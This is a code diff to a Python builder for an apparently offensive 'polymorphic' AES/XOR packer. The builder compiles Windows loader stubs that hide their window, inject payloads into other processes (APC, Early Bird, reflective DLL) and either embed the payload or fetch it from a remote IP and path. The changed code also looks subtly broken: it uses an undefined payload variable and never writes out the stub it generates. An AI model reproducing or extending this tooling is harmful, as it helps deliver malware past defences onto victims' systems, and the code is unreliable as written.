@@ -109,38 +109,52 @@ int {junk_func}() {{
     with open("build/stub.c", "w") as f:
         f.write(stub_code)
 
-def compile_stub(output_name, hide=False, inject_method=None, payload_type=None):
+def compile_stub(output, payload_type, debug=False, hide=False, embed=False, inject_method=None):
+    with open("stub_template.c", "r") as f:
+        stub_template = f.read()
     cmd = [
         "x86_64-w64-mingw32-gcc",
-        "-m64", "-Os",
-        # ensure the compiler can find ReflectiveLoader.h & GetReflectiveLoaderOffset.h
-        "-Iindirect_injection",
-        "-DDEBUG",
-        "build/stub.c",
-        "indirect_injection/GetReflectiveLoaderOffset.c",
-        "-o", output_name,
-        "-lwininet", "-lpsapi", "-lbcrypt"
+        "-m64",
+        "-Os",
+        "-Iindirect_injection"
     ]
+
+    if debug:
+        cmd.append("-DDEBUG")
+
+    if embed:
+        # Write payload into stub
+        payload_array = ','.join([f"0x{b:02x}" for b in payload_data])
+        stub_code = stub_template.replace("{{PAYLOAD_ARRAY}}", payload_array)
+        stub_code = stub_code.replace("{{PAYLOAD_SIZE}}", str(len(payload_data)))
+        stub_code = stub_code.replace("wchar_t IP[64] = L\"{{IP}}\";", "wchar_t IP[64] = L\"\";")
+        stub_code = stub_code.replace("wchar_t PATH[128] = L\"{{PATH}}\";", "wchar_t PATH[128] = L\"\";")
+    else:
+        # Staged build (external download)
+        stub_code = stub_template.replace("{{PAYLOAD_ARRAY}}", "")
+        stub_code = stub_code.replace("{{PAYLOAD_SIZE}}", "0")
+
     if hide:
         cmd.append("-mwindows")
+    else:
+        cmd.append("-mconsole")
 
+    cmd.append("build/stub.c")
+
+    # Only add indirect injection support if it's requested
     if inject_method == "indirect":
-        cmd.extend([
-            "indirect_injection/indirect.c",
-            # we already have -Iindirect_injection above
-        ])
+        cmd.append("indirect_injection/GetReflectiveLoaderOffset.c")
 
-    # for DLLs, compile in the ReflectiveLoader implementation
-    if payload_type == "dll":
-        cmd.append("indirect_injection/ReflectiveLoader.c")
-
-    print(f"[+] Compiling stub: {' '.join(cmd)}")
-    subprocess.run(cmd, check=True)
-
-    # (you can remove the old `if inject_method == "dll":` branch)
+    cmd += [
+        "-o", output,
+        "-lwininet",
+        "-lpsapi",
+        "-lbcrypt"
+    ]
 
     print(f"[+] Compiling stub: {' '.join(cmd)}")
     subprocess.run(cmd, check=True)
+
 
 def main():
     parser = argparse.ArgumentParser(description="POCK: A Polymorphic hardened AES/XOR packer")
@@ -157,6 +171,8 @@ def main():
     parser.add_argument("--inject", choices=["apc", "indirect"], default="apc", help="Injection method")
     parser.add_argument("--target-process", help="Target process name for indirect injection (e.g., notepad.exe)")
     parser.add_argument("--early-bird", action="store_true", help="Enable Early Bird APC injection")
+    parser.add_argument("--embed", action="store_true", help="Embed payload directly into stub (disable staging)")
+    parser.add_argument("--debug", action="store_true", help="Enable debug mode for stub")
     args = parser.parse_args()
 
     print(f"[+] Loading input file: {args.input}")
@@ -209,14 +225,18 @@ def main():
             target_process=args.target_process
         )
 
+    embed = args.embed
+
     print(f"[+] Preparing to compile stub: {args.output}")
     compile_mode = "Hidden (-mwindows)" if args.hide else "Console (-mconsole)"
     print(f"[+] Compile mode: {compile_mode}")
     compile_stub(
-        args.output,
+        output=args.output,
+        payload_type=args.type,
+        debug=args.debug,
         hide=args.hide,
-        inject_method=args.inject,
-        payload_type=args.type
+        embed=embed,
+        inject_method=args.inject
     )
     print(f"[✓] Packing complete: {args.output}")
 
